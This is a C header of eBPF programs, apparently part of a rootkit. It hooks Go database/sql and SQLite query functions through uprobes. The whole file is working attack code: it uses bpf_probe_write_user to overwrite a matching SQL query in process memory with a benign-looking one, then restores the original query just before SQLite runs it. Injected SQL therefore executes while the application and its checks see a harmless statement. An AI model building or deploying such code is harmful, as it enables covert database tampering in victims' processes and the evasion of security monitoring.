/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
/* Copyright (c) 2020
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of version 2 of the GNU General Public
 * License as published by the Free Software Foundation.
 */
#ifndef _SQLI_H_
#define _SQLI_H_

#define SQL_QUERY_LEN 512
#define SQL_QUERY_PATTERN_LEN 45

struct query_override_t {
    u64 len;
    char query[SQL_QUERY_LEN];
};

struct bpf_map_def SEC("maps/query_override_gen") query_override_gen = {
    .type = BPF_MAP_TYPE_PERCPU_ARRAY,
    .key_size = sizeof(u32),
    .value_size = sizeof(struct query_override_t),
    .max_entries = 1,
    .pinning = 0,
    .namespace = "",
};

struct bpf_map_def SEC("maps/query_override") query_override = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(u64),
    .value_size = sizeof(struct query_override_t),
    .max_entries = 1024,
    .pinning = 0,
    .namespace = "",
};

struct query_override_pattern_t {
    char query[SQL_QUERY_PATTERN_LEN];
};

struct bpf_map_def SEC("maps/query_override_pattern") query_override_pattern = {
    .type = BPF_MAP_TYPE_HASH,
    .key_size = sizeof(struct query_override_pattern_t),
    .value_size = sizeof(struct query_override_pattern_t),
    .max_entries = 10,
    .pinning = 0,
    .namespace = "",
};

SEC("uprobe/SQLDBQueryContext")
int sql_db_query_context(struct pt_regs *ctx)
{
    struct query_override_pattern_t pattern = {};
    bpf_probe_read(&pattern.query, sizeof(pattern.query), (void *) PT_REGS_PARM1(ctx));
    char *query_ptr = (void *) PT_REGS_PARM1(ctx);

    struct query_override_pattern_t *override_pattern = bpf_map_lookup_elem(&query_override_pattern, &pattern);
    if (override_pattern == NULL) {
        return 0;
    }

    // save the query
    u64 id = bpf_get_current_pid_tgid();
    u32 key = 0;
    struct query_override_t *override = bpf_map_lookup_elem(&query_override_gen, &key);
    if (override == NULL) {
        // should never happen
        return 0;
    }

    bpf_map_update_elem(&query_override, &id, override, BPF_ANY);
    override = bpf_map_lookup_elem(&query_override, &id);
    if (override == NULL) {
        // should never happen
        return 0;
    }

    char padding = 'n';
    char cursor = 0;

    #pragma unroll
    for (int i = 0; i < SQL_QUERY_LEN - 1; i++) {
        bpf_probe_read(&cursor, 1, query_ptr + i);
        if (cursor == '-') {
            bpf_probe_write_user(query_ptr + i, &padding, 1);
            bpf_probe_write_user(query_ptr + i + 1, &padding, 1);
            override->len += 2;
            goto next;
        }
        override->query[i] = cursor;
        override->len++;

        // override with benign query
        if (i < SQL_QUERY_PATTERN_LEN) {
            // bpf_printk("%d: %d -> %d\n", i, cursor, override_pattern->query[i]);
            bpf_probe_write_user(query_ptr + i, &override_pattern->query[i], 1);
        } else {
            // bpf_printk("%d: %d -> n\n", i, cursor);
            bpf_probe_write_user(query_ptr + i, &padding, 1);
        }
    }

next:
    return 0;
}

SEC("uprobe/SQLiteConnQuery")
int sqlite_conn_query(struct pt_regs *ctx)
{
    char *query_ptr = (void *) PT_REGS_PARM1(ctx);
    u64 id = bpf_get_current_pid_tgid();
    struct query_override_t *override = bpf_map_lookup_elem(&query_override, &id);
    if (override == NULL) {
        // do not override the SQL query
        return 0;
    }

    // bpf_printk("ConnQuery: %s\n", query_ptr);

    #pragma unroll
    for (int i = 0; i < SQL_QUERY_LEN; i++) {
        if (i >= override->len) {
            goto next;
        }
        bpf_probe_write_user(query_ptr + i, &override->query[i], 1);
    }

next:
    // bpf_printk("\tConnQuery: %s\n", query_ptr);
    bpf_map_delete_elem(&query_override, &id);
    return 0;
}

#endif